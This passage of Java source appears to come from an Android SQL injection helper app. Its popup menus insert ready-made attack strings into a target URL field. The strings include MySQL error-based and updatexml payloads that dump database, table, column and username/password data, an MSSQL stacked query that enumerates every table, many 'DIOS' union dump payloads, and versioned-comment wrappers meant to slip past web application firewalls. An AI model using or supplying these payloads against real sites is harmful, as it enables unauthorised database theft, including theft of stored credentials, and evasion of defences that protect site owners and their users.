										if (item.getTitle().equals("QUERY 2")){
										field2.setText(f2+ps2);
									}
										if (item.getTitle().equals("QUERY 3")){
										field2.setText(f2+ps3);
									}
									return true;
								}
							});
						pop.show();

						}
						if (item.getTitle().equals("SQL: SYS_VAR")){
						PopupMenu pop = new PopupMenu(MainActivity.this, ub);
						pop.getMenuInflater().inflate(R.menu.sysvar, pop.getMenu());

						pop.setOnMenuItemClickListener(new PopupMenu.OnMenuItemClickListener(){
								public boolean onMenuItemClick(MenuItem item){

									
									if (item.getTitle().equals("Database")){
											PopupMenu pop = new PopupMenu(MainActivity.this, ub);
											pop.getMenuInflater().inflate(R.menu.sysdb, pop.getMenu());

											pop.setOnMenuItemClickListener(new PopupMenu.OnMenuItemClickListener(){
													public boolean onMenuItemClick(MenuItem item){
														String f2 = field2.getText().toString();

														if (item.getTitle().equals("DATABASE()")){
															field2.setText(f2+item.getTitle());
														}
														if (item.getTitle().equals("SCHEMA()")){
															field2.setText(f2+item.getTitle());
														}
														if (item.getTitle().equals("QUERY 1")){
															field2.setText(f2+"(SELECT+CONCAT(DB)+FROM+INFORMATION_SCHEMA.PROCESSLIST)");
														}return true;
													}
												});
											pop.show();
											}
						
										if (item.getTitle().equals("User")){
											PopupMenu pop = new PopupMenu(MainActivity.this, ub);
											pop.getMenuInflater().inflate(R.menu.user, pop.getMenu());

											pop.setOnMenuItemClickListener(new PopupMenu.OnMenuItemClickListener(){
													public boolean onMenuItemClick(MenuItem item){
														String f2 = field2.getText().toString();

														if (item.getTitle().equals("USER()")){
															field2.setText(f2+item.getTitle());
														}
														if (item.getTitle().equals("CURRENT_USER()")){
															field2.setText(f2+item.getTitle());
														}
														if (item.getTitle().equals("SYSTEM_USER()")){
															field2.setText(f2+item.getTitle());
														}
														if (item.getTitle().equals("SESSION_USER()")){
															field2.setText(f2+item.getTitle());
														}
														if (item.getTitle().equals("QUERY 1")){
															field2.setText(f2+"SUBSTRING_INDEX(USER(),0x40,1)");
														}
														if (item.getTitle().equals("QUERY 2")){
															field2.setText(f2+"(SELECT+CONCAT(USER)+FROM+INFORMATION_SCHEMA.PROCESSLIST)");
														}
														return true;
													}
												});
											pop.show();
											}
									
									if (item.getTitle().equals("Version")){
											PopupMenu pop = new PopupMenu(MainActivity.this, ub);
											pop.getMenuInflater().inflate(R.menu.version, pop.getMenu());

											pop.setOnMenuItemClickListener(new PopupMenu.OnMenuItemClickListener(){
													public boolean onMenuItemClick(MenuItem item){
														String f2 = field2.getText().toString();
														
														if (item.getTitle().equals(" VERSION()")){
															field2.setText(f2+item.getTitle());
														}
														if (item.getTitle().equals(" @@VERSION")){
															field2.setText(f2+item.getTitle());
														}
														if (item.getTitle().equals(" @@GLOBAL.VERSION")){
															field2.setText(f2+item.getTitle());
														}
														
														return true;
								}
							});
						pop.show();

									}
									return true;
								}
							});
						pop.show();

					}
					if (item.getTitle().equals("SQL: MSSQL")){
						PopupMenu pop = new PopupMenu(MainActivity.this, ub);
						pop.getMenuInflater().inflate(R.menu.mssql, pop.getMenu());

						pop.setOnMenuItemClickListener(new PopupMenu.OnMenuItemClickListener(){
								public boolean onMenuItemClick(MenuItem item){

									String query = ";begin declare @x varchar(8000), @y int, @z varchar(50), @a varchar(100) declare @myTbl table (name varchar(8000) not null) SET @y=1 SET @x='injected by rummykhan :: '%2b@@version%2b CHAR(60)%2bCHAR(98)%2bCHAR(114)%2bCHAR(62)%2b'Database : '%2bdb_name()%2b CHAR(60)%2bCHAR(98)%2bCHAR(114)%2bCHAR(62) SET @z='' SET @a='' WHILE @y<=(SELECT COUNT(table_name) from INFORMATION_SCHEMA.TABLES) begin SET @a='' Select @z=table_name from INFORMATION_SCHEMA.TABLES where TABLE_NAME not in (select name from @myTbl) select @a=@a %2b column_name%2b' : ' from INFORMATION_SCHEMA.COLUMNS where TABLE_NAME=@z insert @myTbl values(@z) SET @x=@x %2b  CHAR(60)%2bCHAR(98)%2bCHAR(114)%2bCHAR(62)%2b'Table: '%2b@z%2b CHAR(60)%2bCHAR(98)%2bCHAR(114)%2bCHAR(62)%2b'Columns : '%2b@a%2b CHAR(60)%2bCHAR(98)%2bCHAR(114)%2bCHAR(62) SET @y = @y%2b1 end select @x as output into Chall1 END--";

									String f2 = field2.getText().toString();

									if (item.getTitle().equals("QUERY 1")){
										field2.setText(f2+query);
									}
									return true;
								}
							});
						pop.show();

					}
						
			if (item.getTitle().equals("SQL: Error Based")){
				PopupMenu pop = new PopupMenu(MainActivity.this, ub);
				pop.getMenuInflater().inflate(R.menu.errbase, pop.getMenu());

				pop.setOnMenuItemClickListener(new PopupMenu.OnMenuItemClickListener(){
						public boolean onMenuItemClick(MenuItem item){
							
							//Error Based
							String eb_db = "+or+1+group+by+concat_ws(0x3a,version(),floor(rand(0)*2))having+min(0)+or+1--";
							String eb_table = "+and+(select+1+from(select+count(*),concat((select(select+concat(cast(table_name+as+char),0x7e))+from+information_schema.tables+where+table_schema=database()limit+0,1),floor(rand(0)*2))x+from+information_schema.tables+group+by+x)a)";
							String eb_column = "+and+(select+1+from+(select+count(*),concat((select(select+concat(cast(column_name+as+char),0x7e))+from+information_schema.columns+where+table_name=0x+limit+0,1),floor(rand(0)*2))x+from+information_schema.tables+group+by+x)a)";
							String eb_extract = "+and+(select+1+from+(select+count(*),concat((select(select+concat(cast(concat(username,0x7e,password)as+char),0x7e))+from+DATABASENAME.TABLE­NAME+limit+0,1),floor(rand(0)*2))x+from+information_schema.tables+group+by+x)a)";
							String xmlupdate = "and updatexml(null,concat(0x0a,(select table_name from information_schema.tables where table_schema=database() limit 0,1)),null";
							String f2 = field2.getText().toString();
							
							if (item.getTitle().equals("DATABASE")){
								field2.setText(f2+eb_db);
							}
							if (item.getTitle().equals("TABLE")){
								field2.setText(f2+eb_table);
							}
							if (item.getTitle().equals("COLUMN")){
								field2.setText(f2+eb_column);
							}
							if (item.getTitle().equals("DUMP DATA")){
								field2.setText(f2+eb_extract);
							}
							if (item.getTitle().equals("XML UPDATE")){
								field2.setText(f2+xmlupdate);
							}
							
							
							
							return true;
				}
			});
		pop.show();
							
				
			}

		
			
		if (item.getTitle().equals("SQL: Union Based")){
		
		PopupMenu pop = new PopupMenu(MainActivity.this, ub);
		pop.getMenuInflater().inflate(R.menu.ubmnu, pop.getMenu());

		pop.setOnMenuItemClickListener(new PopupMenu.OnMenuItemClickListener(){
				public boolean onMenuItemClick(MenuItem item){

					//madblood
					if (item.getTitle().equals("DIOS by Madblood WAF")){

						LayoutInflater li = LayoutInflater.from(context);
						View prompt = li.inflate(R.layout.ubp, null);

						AlertDialog.Builder alertDialogBuilder = new AlertDialog.Builder(
							context);
						alertDialogBuilder.setView(prompt);

						final EditText Input = (EditText) prompt
							.findViewById(R.id.editText1);
						alertDialogBuilder
							.setCancelable(false)
							.setPositiveButton("OK",
							new DialogInterface.OnClickListener() {
								public void onClick(DialogInterface dialog,
													int id){


									String i = field2.getText().toString();
									String i2 = field2.getText().toString()+"-- -";

									String inp = Input.getText().toString();

									if (i.contains(","+inp+",")){
										String ni = i.replace(","+inp+",", ","+madblood+",");

										field2.setText(ni);
									}else  if (i2.contains(","+inp+"-- -")){
										String ni = i2.replace(","+inp+"-- -", ","+madblood);

										field2.setText(ni);
									}else{

										String ni = i.replace(" "+inp, " "+madblood);

										field2.setText(ni);

									}
								}
							})
							.setNegativeButton("Cancel",
							new DialogInterface.OnClickListener() {
								public void onClick(DialogInterface dialog,
													int id){
									dialog.cancel();
								}
							});
						AlertDialog alertDialog = alertDialogBuilder.create();
						alertDialog.show();


					}else if (item.getTitle().equals("Basic DIOS 1")){
						LayoutInflater li = LayoutInflater.from(context);
						View prompt = li.inflate(R.layout.basic1, null);

						AlertDialog.Builder alertDialogBuilder = new AlertDialog.Builder(
							context);
						alertDialogBuilder.setView(prompt);

						final EditText Input = (EditText) prompt
							.findViewById(R.id.editText1);
						alertDialogBuilder
							.setCancelable(false)
							.setPositiveButton("OK",
							new DialogInterface.OnClickListener() {
								public void onClick(DialogInterface dialog,
													int id){
									String i = field2.getText().toString();
									String i2 = field2.getText().toString()+"-- -";
									String inp = Input.getText().toString();
									if (i.contains(","+inp+",")){
										String ni = i.replace(","+inp+",", ","+basic1+",");
										field2.setText(ni);
									}else  if (i2.contains(","+inp+"-- -")){
										String ni = i2.replace(","+inp+"-- -", ","+basic1);
										field2.setText(ni);
									}else{
										String ni = i.replace(" "+inp, " "+basic1);
										field2.setText(ni);
									}
								}
							})
							.setNegativeButton("Cancel",
							new DialogInterface.OnClickListener() {
								public void onClick(DialogInterface dialog,
													int id){
									dialog.cancel();
								}
							});
						AlertDialog alertDialog = alertDialogBuilder.create();
						alertDialog.show();
					}else if (item.getTitle().equals("Basic DIOS 2")){
						LayoutInflater li = LayoutInflater.from(context);
						View prompt = li.inflate(R.layout.basic2, null);

						AlertDialog.Builder alertDialogBuilder = new AlertDialog.Builder(
							context);
						alertDialogBuilder.setView(prompt);

						final EditText Input = (EditText) prompt
							.findViewById(R.id.editText1);
						alertDialogBuilder
							.setCancelable(false)
							.setPositiveButton("OK",
							new DialogInterface.OnClickListener() {
								public void onClick(DialogInterface dialog,
													int id){
									String i = field2.getText().toString();
									String i2 = field2.getText().toString()+"-- -";
									String inp = Input.getText().toString();
									if (i.contains(","+inp+",")){
										String ni = i.replace(","+inp+",", ","+basic2+",");
										field2.setText(ni);
									}else  if (i2.contains(","+inp+"-- -")){
										String ni = i2.replace(","+inp+"-- -", ","+basic2);
										field2.setText(ni);
									}else{
										String ni = i.replace(" "+inp, " "+basic2);
										field2.setText(ni);
									}
								}
							})
							.setNegativeButton("Cancel",
							new DialogInterface.OnClickListener() {
								public void onClick(DialogInterface dialog,
													int id){
									dialog.cancel();
								}
							});
						AlertDialog alertDialog = alertDialogBuilder.create();
						alertDialog.show();
					}else if (item.getTitle().equals("DIOS by d4rkj1n")){
						LayoutInflater li = LayoutInflater.from(context);
						View prompt = li.inflate(R.layout.darkjin, null);

						AlertDialog.Builder alertDialogBuilder = new AlertDialog.Builder(
							context);
						alertDialogBuilder.setView(prompt);

						final EditText Input = (EditText) prompt
							.findViewById(R.id.editText1);
						alertDialogBuilder
							.setCancelable(false)
							.setPositiveButton("OK",
							new DialogInterface.OnClickListener() {
								public void onClick(DialogInterface dialog,
													int id){
									String i = field2.getText().toString();
									String i2 = field2.getText().toString()+"-- -";
									String inp = Input.getText().toString();
									if (i.contains(","+inp+",")){
										String ni = i.replace(","+inp+",", ","+darkjin+",");
										field2.setText(ni);
									}else  if (i2.contains(","+inp+"-- -")){
										String ni = i2.replace(","+inp+"-- -", ","+darkjin);
										field2.setText(ni);
									}else{
										String ni = i.replace(" "+inp, " "+darkjin);
										field2.setText(ni);
									}
								}
							})
							.setNegativeButton("Cancel",
							new DialogInterface.OnClickListener() {
								public void onClick(DialogInterface dialog,
													int id){
									dialog.cancel();
								}
							});
						AlertDialog alertDialog = alertDialogBuilder.create();
						alertDialog.show();
					}else if (item.getTitle().equals("DIOS by d4rkj1n WAF")){
						LayoutInflater li = LayoutInflater.from(context);
						View prompt = li.inflate(R.layout.darkjinwaf, null);

						AlertDialog.Builder alertDialogBuilder = new AlertDialog.Builder(
							context);
						alertDialogBuilder.setView(prompt);

						final EditText Input = (EditText) prompt
							.findViewById(R.id.editText1);
						alertDialogBuilder
							.setCancelable(false)
							.setPositiveButton("OK",
							new DialogInterface.OnClickListener() {
								public void onClick(DialogInterface dialog,
													int id){
									String i = field2.getText().toString();
									String i2 = field2.getText().toString()+"-- -";
									String inp = Input.getText().toString();
									if (i.contains(","+inp+",")){
										String ni = i.replace(","+inp+",", ","+darkjinwaf+",");
										field2.setText(ni);
									}else  if (i2.contains(","+inp+"-- -")){
										String ni = i2.replace(","+inp+"-- -", ","+darkjinwaf);
										field2.setText(ni);
									}else{
										String ni = i.replace(" "+inp, " "+darkjinwaf);
										field2.setText(ni);
									}
								}
							})
							.setNegativeButton("Cancel",
							new DialogInterface.OnClickListener() {
								public void onClick(DialogInterface dialog,
													int id){
									dialog.cancel();
								}
							});
						AlertDialog alertDialog = alertDialogBuilder.create();
						alertDialog.show();
					}else if (item.getTitle().equals("DIOS by r0ot@h3x49")){
						LayoutInflater li = LayoutInflater.from(context);
						View prompt = li.inflate(R.layout.roothex, null);

						AlertDialog.Builder alertDialogBuilder = new AlertDialog.Builder(
							context);
						alertDialogBuilder.setView(prompt);

						final EditText Input = (EditText) prompt
							.findViewById(R.id.editText1);
						alertDialogBuilder
							.setCancelable(false)
							.setPositiveButton("OK",
							new DialogInterface.OnClickListener() {
								public void onClick(DialogInterface dialog,
													int id){
									String i = field2.getText().toString();
									String i2 = field2.getText().toString()+"-- -";
									String inp = Input.getText().toString();
									if (i.contains(","+inp+",")){
										String ni = i.replace(","+inp+",", ","+roothex+",");
										field2.setText(ni);
									}else  if (i2.contains(","+inp+"-- -")){
										String ni = i2.replace(","+inp+"-- -", ","+roothex);
										field2.setText(ni);
									}else{
										String ni = i.replace(" "+inp, " "+roothex);
										field2.setText(ni);
									}
								}
							})
							.setNegativeButton("Cancel",
							new DialogInterface.OnClickListener() {
								public void onClick(DialogInterface dialog,
													int id){
									dialog.cancel();
								}
							});
						AlertDialog alertDialog = alertDialogBuilder.create();
						alertDialog.show();
					}else if (item.getTitle().equals("DIOS by Madblood r00t")){
						LayoutInflater li = LayoutInflater.from(context);
						View prompt = li.inflate(R.layout.mbloodroot, null);

						AlertDialog.Builder alertDialogBuilder = new AlertDialog.Builder(
							context);
						alertDialogBuilder.setView(prompt);

						final EditText Input = (EditText) prompt
							.findViewById(R.id.editText1);
						alertDialogBuilder
							.setCancelable(false)
							.setPositiveButton("OK",
							new DialogInterface.OnClickListener() {
								public void onClick(DialogInterface dialog,
													int id){
									String i = field2.getText().toString();
									String i2 = field2.getText().toString()+"-- -";
									String inp = Input.getText().toString();
									if (i.contains(","+inp+",")){
										String ni = i.replace(","+inp+",", ","+madbloodroot+",");
										field2.setText(ni);
									}else  if (i2.contains(","+inp+"-- -")){
										String ni = i2.replace(","+inp+"-- -", ","+madbloodroot);
										field2.setText(ni);
									}else{

										String ni = i.replace(" "+inp, " "+madbloodroot);

										field2.setText(ni);

									}
								}
							})


							.setNegativeButton("Cancel",
							new DialogInterface.OnClickListener() {
								public void onClick(DialogInterface dialog,
													int id){


									dialog.cancel();
								}
							});


						AlertDialog alertDialog = alertDialogBuilder.create();


						alertDialog.show();


						//trojan waf

					}else if (item.getTitle().equals("DIOS by tr0jan WAF")){

						LayoutInflater li = LayoutInflater.from(context);
						View prompt = li.inflate(R.layout.trojan, null);

						AlertDialog.Builder alertDialogBuilder = new AlertDialog.Builder(
							context);
						alertDialogBuilder.setView(prompt);

						final EditText Input = (EditText) prompt
							.findViewById(R.id.editText1);
						alertDialogBuilder
							.setCancelable(false)
							.setPositiveButton("OK",
							new DialogInterface.OnClickListener() {
								public void onClick(DialogInterface dialog,
													int id){


									String i = field2.getText().toString();
									String i2 = field2.getText().toString()+"-- -";

									String inp = Input.getText().toString();

									if (i.contains(","+inp+",")){
										String ni = i.replace(","+inp+",", ","+trojan+",");

										field2.setText(ni);
									}else  if (i2.contains(","+inp+"-- -")){
										String ni = i2.replace(","+inp+"-- -", ","+trojan);

										field2.setText(ni);
									}else{

										String ni = i.replace(" "+inp, " "+trojan);

										field2.setText(ni);

									}					}
							})


							.setNegativeButton("Cancel",
							new DialogInterface.OnClickListener() {
								public void onClick(DialogInterface dialog,
													int id){


									dialog.cancel();
								}
							});


						AlertDialog alertDialog = alertDialogBuilder.create();


						alertDialog.show();


					}else if (item.getTitle().equals("DIOS by DR. Z3RO")){

						LayoutInflater li = LayoutInflater.from(context);
						View prompt = li.inflate(R.layout.drzero, null);

						AlertDialog.Builder alertDialogBuilder = new AlertDialog.Builder(
							context);
						alertDialogBuilder.setView(prompt);

						final EditText Input = (EditText) prompt
							.findViewById(R.id.editText1);
						alertDialogBuilder
							.setCancelable(false)
							.setPositiveButton("OK",
							new DialogInterface.OnClickListener() {
								public void onClick(DialogInterface dialog,
													int id){


									String i = field2.getText().toString();
									String i2 = field2.getText().toString()+"-- -";

									String inp = Input.getText().toString();

									if (i.contains(","+inp+",")){
										String ni = i.replace(","+inp+",", ","+drzero+",");
										field2.setText(ni);
									}else  if (i2.contains(","+inp+"-- -")){
										String ni = i2.replace(","+inp+"-- -", ","+drzero);
										field2.setText(ni);
									}else{

										String ni = i.replace(" "+inp, " "+drzero);

										field2.setText(ni);

									}					}
							})


							.setNegativeButton("Cancel",
							new DialogInterface.OnClickListener() {
								public void onClick(DialogInterface dialog,
													int id){


									dialog.cancel();
								}
							});


						AlertDialog alertDialog = alertDialogBuilder.create();


						alertDialog.show();


					}else if (item.getTitle().equals("DIOS by Makman2")){

						LayoutInflater li = LayoutInflater.from(context);
						View prompt = li.inflate(R.layout.makmann, null);

						AlertDialog.Builder alertDialogBuilder = new AlertDialog.Builder(
							context);
						alertDialogBuilder.setView(prompt);

						final EditText Input = (EditText) prompt
							.findViewById(R.id.editText1);
						alertDialogBuilder
							.setCancelable(false)
							.setPositiveButton("OK",
							new DialogInterface.OnClickListener() {
								public void onClick(DialogInterface dialog,
													int id){


									String i = field2.getText().toString();
									String i2 = field2.getText().toString()+"-- -";

									String inp = Input.getText().toString();

									if (i.contains(","+inp+",")){
										String ni = i.replace(","+inp+",", ","+makman2+",");

										field2.setText(ni);
									}else  if (i2.contains(","+inp+"-- -")){
										String ni = i2.replace(","+inp+"-- -", ","+makman2);

										field2.setText(ni);
									}else{

										String ni = i.replace(" "+inp, " "+makman2);

										field2.setText(ni);

									}					}
							})


							.setNegativeButton("Cancel",
							new DialogInterface.OnClickListener() {
								public void onClick(DialogInterface dialog,
													int id){


									dialog.cancel();
								}
							});


						AlertDialog alertDialog = alertDialogBuilder.create();


						alertDialog.show();


					}else if (item.getTitle().equals("DIOS by Zen WAF")){

						LayoutInflater li = LayoutInflater.from(context);
						View prompt = li.inflate(R.layout.zenwaf, null);

						AlertDialog.Builder alertDialogBuilder = new AlertDialog.Builder(
							context);
						alertDialogBuilder.setView(prompt);

						final EditText Input = (EditText) prompt
							.findViewById(R.id.editText1);
						alertDialogBuilder
							.setCancelable(false)
							.setPositiveButton("OK",
							new DialogInterface.OnClickListener() {
								public void onClick(DialogInterface dialog,
													int id){


									String i = field2.getText().toString();
									String i2 = field2.getText().toString()+"-- -";

									String inp = Input.getText().toString();

									if (i.contains(","+inp+",")){
										String ni = i.replace(","+inp+",", ","+zenwaf+",");

										field2.setText(ni);
									}else  if (i2.contains(","+inp+"-- -")){
										String ni = i2.replace(","+inp+"-- -", ","+zenwaf);

										field2.setText(ni);
									}else{

										String ni = i.replace(" "+inp, " "+zenwaf);

										field2.setText(ni);

									}					}
							})


							.setNegativeButton("Cancel",
							new DialogInterface.OnClickListener() {
								public void onClick(DialogInterface dialog,
													int id){


									dialog.cancel();
								}
							});


						AlertDialog alertDialog = alertDialogBuilder.create();


						alertDialog.show();


					}else if (item.getTitle().equals("DIOS WAF")){

						LayoutInflater li = LayoutInflater.from(context);
						View prompt = li.inflate(R.layout.waff, null);

						AlertDialog.Builder alertDialogBuilder = new AlertDialog.Builder(
							context);
						alertDialogBuilder.setView(prompt);

						final EditText Input = (EditText) prompt
							.findViewById(R.id.editText1);
						alertDialogBuilder
							.setCancelable(false)
							.setPositiveButton("OK",
							new DialogInterface.OnClickListener() {
								public void onClick(DialogInterface dialog,
													int id){


									String i = field2.getText().toString();
									String i2 = field2.getText().toString()+"-- -";

									String inp = Input.getText().toString();

									if (i.contains(","+inp+",")){
										String ni = i.replace(","+inp+",", ","+waff+",");

										field2.setText(ni);
									}else  if (i2.contains(","+inp+"-- -")){
										String ni = i2.replace(","+inp+"-- -", ","+waff);

										field2.setText(ni);
									}else{

										String ni = i.replace(" "+inp, " "+waff);

										field2.setText(ni);

									}					}
							})


							.setNegativeButton("Cancel",
							new DialogInterface.OnClickListener() {
								public void onClick(DialogInterface dialog,
													int id){


									dialog.cancel();
								}
							});


						AlertDialog alertDialog = alertDialogBuilder.create();


						alertDialog.show();


					}else if (item.getTitle().equals("Dump data")){

						LayoutInflater li = LayoutInflater.from(context);
						View prompt = li.inflate(R.layout.dumpdata, null);

						AlertDialog.Builder alertDialogBuilder = new AlertDialog.Builder(
							context);
						alertDialogBuilder.setView(prompt);

						final EditText db = (EditText) prompt
							.findViewById(R.id.dddb);
						final EditText table = (EditText) prompt
							.findViewById(R.id.ddtbl);	

						final EditText columns = (EditText) prompt
							.findViewById(R.id.ddcol);

						final EditText Input = (EditText) prompt
							.findViewById(R.id.editText1);

						alertDialogBuilder
							.setCancelable(false)
							.setPositiveButton("OK",
							new DialogInterface.OnClickListener() {
								public void onClick(DialogInterface dialog,
													int id){



									String cd = "(SELECT(@x)FROM(SELECT(@x:=0x00) ,(SELECT(@x)FROM("+table.getText().toString()+")WHERE(@x)IN(@x:=CONCAT(0x20,@x,"+columns.getText().toString()+",0x3c62723e))))x)";
									String cd1 = "(SELECT(@x)FROM(SELECT(@x:=0x00) ,(SELECT(@x)FROM("+db.getText().toString()+"."+table.getText().toString()+")WHERE(@x)IN(@x:=CONCAT(0x20,@x,"+columns.getText().toString()+",0x3c62723e))))x)";

									String i = field2.getText().toString();
									String i2 = field2.getText().toString()+"-- -";


									String inp = Input.getText().toString();

									if (inp.length()<1){}

									if (db.getText().toString().equals("DATABASE()")){		

										if (i.contains(","+inp+",")){
											String ni = i.replace(","+inp+",", ","+cd+",");

											field2.setText(ni);
										}else  if (i2.contains(","+inp+"-- -")){
											String ni = i2.replace(","+inp+"-- -", ","+cd);

											field2.setText(ni);
										}else{

											String ni = i.replace(" "+inp, " "+cd1);
											field2.setText(ni);
										}	
									}else{
										if (i.contains(","+inp+",")){
											String ni = i.replace(","+inp+",", ","+cd1+",");

											field2.setText(ni);
										}else  if (i2.contains(","+inp+"-- -")){
											String ni = i2.replace(","+inp+"-- -", ","+cd1);
											field2.setText(ni);
										}else{

											String ni = i.replace(" "+inp, " "+cd1);
											field2.setText(ni);
										}	

									}

								}


							})


							.setNegativeButton("Cancel",
							new DialogInterface.OnClickListener() {
								public void onClick(DialogInterface dialog,
													int id){


									dialog.cancel();
								}
							});


						AlertDialog alertDialog = alertDialogBuilder.create();


						alertDialog.show();

					}else if (item.getTitle().equals("Database")){

						LayoutInflater li = LayoutInflater.from(context);
						View prompt = li.inflate(R.layout.database, null);

						AlertDialog.Builder alertDialogBuilder = new AlertDialog.Builder(
							context);
						alertDialogBuilder.setView(prompt);



						final EditText Input = (EditText) prompt
							.findViewById(R.id.editText1);

						alertDialogBuilder
							.setCancelable(false)
							.setPositiveButton("OK",
							new DialogInterface.OnClickListener() {
								public void onClick(DialogInterface dialog,
													int id){



									String cd = "(SELECT+GROUP_CONCAT(schema_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.SCHEMATA)";

									String i = field2.getText().toString();
									String i2 = field2.getText().toString()+"-- -";

									String inp = Input.getText().toString();

									if (inp.length()<1){}else{
										if (i.contains(","+inp+",")){
											String ni = i.replace(","+inp+",", ","+cd+",");

											field2.setText(ni);
										}else  if (i2.contains(","+inp+"-- -")){
											String ni = i2.replace(","+inp+"-- -", ","+cd);

											field2.setText(ni);
										}else{

											String ni = i.replace(" "+inp, " "+cd);
											field2.setText(ni);
										}	
									}


								}
							})


							.setNegativeButton("Cancel",
							new DialogInterface.OnClickListener() {
								public void onClick(DialogInterface dialog,
													int id){


									dialog.cancel();
								}
							});


						AlertDialog alertDialog = alertDialogBuilder.create();


						alertDialog.show();

					}else if (item.getTitle().equals("Columns")){

						LayoutInflater li = LayoutInflater.from(context);
						View prompt = li.inflate(R.layout.columns, null);

						AlertDialog.Builder alertDialogBuilder = new AlertDialog.Builder(
							context);
						alertDialogBuilder.setView(prompt);

						final EditText table = (EditText) prompt
							.findViewById(R.id.ddtbl);	


						final EditText Input = (EditText) prompt
							.findViewById(R.id.editText1);

						alertDialogBuilder
							.setCancelable(false)
							.setPositiveButton("OK",
							new DialogInterface.OnClickListener() {
								public void onClick(DialogInterface dialog,
													int id){




									String cd = "(SELECT+GROUP_CONCAT(column_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+TABLE_NAME="+table.getText().toString()+")";
									String i = field2.getText().toString();
									String i2 = field2.getText().toString()+"-- -";

									String inp = Input.getText().toString();

									if (inp.length()<1){}else{
										if (i.contains(","+inp+",")){
											String ni = i.replace(","+inp+",", ","+cd+",");

											field2.setText(ni);
										}else  if (i2.contains(","+inp+"-- -")){
											String ni = i2.replace(","+inp+"-- -", ","+cd);

											field2.setText(ni);
										}else{

											String ni = i.replace(" "+inp, " "+cd);
											field2.setText(ni);
										}	
									}


								}
							})


							.setNegativeButton("Cancel",
							new DialogInterface.OnClickListener() {
								public void onClick(DialogInterface dialog,
													int id){


									dialog.cancel();
								}
							});


						AlertDialog alertDialog = alertDialogBuilder.create();


						alertDialog.show();

					}else if (item.getTitle().equals("Table")){

						LayoutInflater li = LayoutInflater.from(context);
						View prompt = li.inflate(R.layout.table, null);

						AlertDialog.Builder alertDialogBuilder = new AlertDialog.Builder(
							context);
						alertDialogBuilder.setView(prompt);

						final EditText db = (EditText) prompt
							.findViewById(R.id.dddb);	


						final EditText Input = (EditText) prompt
							.findViewById(R.id.editText1);

						alertDialogBuilder
							.setCancelable(false)
							.setPositiveButton("OK",
							new DialogInterface.OnClickListener() {
								public void onClick(DialogInterface dialog,
													int id){




									String cd = "(SELECT+GROUP_CONCAT(table_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_SCHEMA="+db.getText().toString()+")";
									String i = field2.getText().toString();
									String i2 = field2.getText().toString()+"-- -";

									String inp = Input.getText().toString();

									if (inp.length()<1){}else{
										if (i.contains(","+inp+",")){
											String ni = i.replace(","+inp+",", ","+cd+",");

											field2.setText(ni);
										}else  if (i2.contains(","+inp+"-- -")){
											String ni = i2.replace(","+inp+"-- -", ","+cd);

											field2.setText(ni);
										}else{

											String ni = i.replace(" "+inp, " "+cd);
											field2.setText(ni);
										}	
									}


								}
							})


							.setNegativeButton("Cancel",
							new DialogInterface.OnClickListener() {
								public void onClick(DialogInterface dialog,
													int id){


									dialog.cancel();
								}
							});


						AlertDialog alertDialog = alertDialogBuilder.create();


						alertDialog.show();

					}else{

					}

					return true;


				}
			});
		pop.show();
		}
		
					return true;


				}
			});
		pop.show();
	}

	//#_______________

	public void waf(View v){

		PopupMenu pop = new PopupMenu(MainActivity.this, waf);
		pop.getMenuInflater().inflate(R.menu.wafbypass, pop.getMenu());

		pop.setOnMenuItemClickListener(new PopupMenu.OnMenuItemClickListener(){
				public boolean onMenuItemClick(MenuItem item){

					if (item.getTitle().equals("/*!12345*/")){

						LayoutInflater li = LayoutInflater.from(context);
						View prompt = li.inflate(R.layout.waf12345, null);

						AlertDialog.Builder alertDialogBuilder = new AlertDialog.Builder(
							context);
						alertDialogBuilder.setView(prompt);

						final EditText Input = (EditText) prompt
							.findViewById(R.id.editText1);
						alertDialogBuilder
							.setCancelable(false)
							.setPositiveButton("OK",
							new DialogInterface.OnClickListener() {
								public void onClick(DialogInterface dialog,
													int id){

									String i = field2.getText().toString();
									String inp = Input.getText().toString();
									if (i.contains(inp)){
										String ni = i.replace(inp, "/*!12345"+inp+"*/");

										field2.setText(ni);

									}else{
										field2.setText(i+"/*!12345"+inp+"*/");
									}
								}

							})


							.setNegativeButton("Cancel",
							new DialogInterface.OnClickListener() {
								public void onClick(DialogInterface dialog,
													int id){


									dialog.cancel();
								}
							});


						AlertDialog alertDialog = alertDialogBuilder.create();


						alertDialog.show();

					}else{

						if (item.getTitle().equals("/*!50000*/")){

							LayoutInflater li = LayoutInflater.from(context);
							View prompt = li.inflate(R.layout.waf50000, null);

							AlertDialog.Builder alertDialogBuilder = new AlertDialog.Builder(
								context);
							alertDialogBuilder.setView(prompt);

							final EditText Input = (EditText) prompt
								.findViewById(R.id.editText1);
							alertDialogBuilder
								.setCancelable(false)
								.setPositiveButton("OK",
								new DialogInterface.OnClickListener() {
									public void onClick(DialogInterface dialog,
														int id){
										String i = field2.getText().toString();
										String inp = Input.getText().toString();
										if (i.contains(inp)){
											String ni = i.replace(inp, "/*!50000"+inp+"*/");

											field2.setText(ni);
										}else{
											field2.setText(i+"/*!50000"+inp+"*/");
										}
									}
								})
								.setNegativeButton("Cancel",
								new DialogInterface.OnClickListener() {
									public void onClick(DialogInterface dialog,
														int id){
										dialog.cancel();
									}
								});


							AlertDialog alertDialog = alertDialogBuilder.create();
							alertDialog.show();

						}else{

							if (item.getTitle().equals("/*!13337*/")){

								LayoutInflater li = LayoutInflater.from(context);
								View prompt = li.inflate(R.layout.waf13337, null);

								AlertDialog.Builder alertDialogBuilder = new AlertDialog.Builder(
									context);
								alertDialogBuilder.setView(prompt);

								final EditText Input = (EditText) prompt
									.findViewById(R.id.editText1);
								alertDialogBuilder
									.setCancelable(false)
									.setPositiveButton("OK",
									new DialogInterface.OnClickListener() {
										public void onClick(DialogInterface dialog,
															int id){


											String i = field2.getText().toString();
											String inp = Input.getText().toString();
											if (i.contains(inp)){
												String ni = i.replace(inp, "/*!13337"+inp+"*/");

												field2.setText(ni);
											}else{
												field2.setText(i+"/*!13337"+inp+"*/");
											}
										}
									})
									.setNegativeButton("Cancel",
									new DialogInterface.OnClickListener() {
										public void onClick(DialogInterface dialog,
															int id){
											dialog.cancel();
										}
									});
								AlertDialog alertDialog = alertDialogBuilder.create();
								alertDialog.show();
							}
							
							if (item.getTitle().equals("OVERFLOW")){
								
								LayoutInflater li = LayoutInflater.from(context);
								View prompt = li.inflate(R.layout.uselect, null);

